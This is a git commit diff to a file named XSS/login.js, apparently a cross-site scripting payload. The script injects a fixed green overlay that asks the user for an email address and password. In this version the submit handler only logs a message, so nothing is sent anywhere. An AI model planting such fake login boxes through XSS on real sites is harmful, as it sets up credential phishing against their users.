6150db35fa093ae402522e3b54a76c2d2d63d410
nullsc <53406164+nullsc@users.noreply.github.com>
2024-03-04 23:52:07 +0000

    Update login.js

--- XSS/login.js
+++ XSS/login.js
@@ -2,14 +2,25 @@ const box = document.createElement('div')
 box.innerHTML = `
 <p>Please enter your password below!</p>
 
-	<form>
-		<div>
-			<input type="text" class="" placeholder="Email address">
-			<input type="password" class="" placeholder="Password">
-			<button id="xssbutton" type="submit" class="">Submit</button>
-		</div>
-	</form>
+  <form id="xssform">
+    <div>
+      <input type="email" class="" placeholder="Email address">
+      <input type="password" class="" placeholder="Password">
+      <button id="xssbutton" type="submit" class="">Submit</button>
+    </div>
+  </form>
   
 `;
 box.setAttribute("z-index", "99999");
+box.style.position = "fixed";
+box.style.top = "50px";
+box.style.margin = "0 auto";
+box.style.background = "green";
+box.style.padding = "10px";
 document.body.appendChild(box);
+document.querySelector("#xssbutton").addEventListener("click", (e) => {
+  e.stopPropagation();
+  e.preventDefault();
+
+  console.log("button clicked!")
+});
